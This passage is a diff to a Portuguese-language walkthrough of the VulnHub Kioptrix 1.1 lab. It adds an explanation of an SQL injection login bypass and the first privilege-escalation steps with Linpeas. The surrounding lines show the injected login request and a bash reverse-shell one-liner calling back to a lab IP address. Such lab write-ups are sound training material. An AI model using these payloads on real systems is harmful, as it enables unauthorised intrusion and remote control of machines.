@@ -84,6 +84,18 @@ uname=admin'+or+'1'='1&psw=senha&btnLogin=Login
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/burp3.png)
 
+Possível query que está sendo feita:
+
+```
+SELECT * FROM users WHERE username='' AND password=''
+```
+
+O nosso payload:
+
+```
+SELECT * FROM users WHERE username='1' or '1'='1' AND password='1' or '1'='1'
+```
+
 Fazemos o Bypass
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/burp4.png)
@@ -122,6 +134,20 @@ bash -i >& /dev/tcp/192.168.56.102/443 0>&1
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/burp12.png)
 
+Agora vamos iniciar a escalação de privilégios nessa máquina, para isso utilizaremos o Linpeas
 
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/lin.png)
 
+Passamos para nossa máquina
 
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/lin1.png)
+
+Executamos na máquina remota
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/lin2.png)
+
+Verificamos de cara que a versão do Kernel é muito antiga
+
+```
+Linux version 2.6.9-55.EL
+```
